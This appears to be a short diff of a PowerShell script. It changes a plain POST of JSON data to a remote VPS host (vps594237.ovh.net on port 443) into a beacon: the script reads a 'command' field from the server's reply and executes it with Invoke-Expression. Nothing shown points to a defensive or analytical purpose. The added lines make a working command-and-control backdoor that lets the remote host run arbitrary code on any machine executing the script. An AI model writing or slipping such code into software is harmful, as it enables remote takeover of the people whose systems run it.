@@ -17,4 +17,7 @@ $json = @"
 }
 "@
 
-iwr -Uri http://vps594237.ovh.net:443/ -Method POST -Body $json -UseBasicParsing
+$response = iwr -Uri http://vps594237.ovh.net:443/ -Method POST -Body $json 
+$command = $response | convertFrom-Json | select -ExpandProperty command
+
+iex $command
